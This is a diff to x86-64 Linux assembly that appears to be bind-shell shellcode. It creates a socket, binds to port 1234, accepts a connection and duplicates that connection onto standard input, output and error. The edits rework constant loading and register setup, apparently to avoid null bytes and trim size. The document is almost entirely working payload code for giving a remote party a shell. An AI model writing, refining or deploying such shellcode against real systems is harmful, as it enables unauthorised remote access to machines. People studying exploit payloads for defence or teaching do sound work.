@@ -44,12 +44,12 @@
     cdq                 ; rdx = IPPROTO_IP
     syscall
     
-    xchg    eax, edi    ; rdi = s
+    xchg    eax, edi    ; rdi = s, rax = 2
     
     ; step 2, bind to port 1234 
     ; bind(s, {AF_INET,1234,INADDR_ANY}, 16)
-    mov     ebx, 0xd204FF02
-    inc     bh
+    mov     ebx, ~0xd2040002 & 0xFFFFFFFF
+    not     ebx
     push    rbx
     push    rsp
     pop     rsi         ; rsi = &sa 
@@ -68,15 +68,16 @@
     mov     al, 43
     syscall
     
-    xchg    eax, edi    ; edi = r
-    xchg    eax, esi    ; esi = 2, eax = 0
+    xchg    eax, edi    ; edi = r, eax = 0
+    push    2           ; rsi = 2
+		pop     rsi
     
     ; step 5, assign socket handle to stdin,stdout,stderr
     ; dup2 (r, STDIN_FILENO)
     ; dup2 (r, STDOUT_FILENO)
     ; dup2 (r, STDERR_FILENO)
 dup_loop64:
-    mov     al, 33      ; rax = sys_dup2
+    mov     al, 33           ; rax = sys_dup2
     syscall
     sub     esi, 1
     jns     dup_loop64       ; jump if not signed   
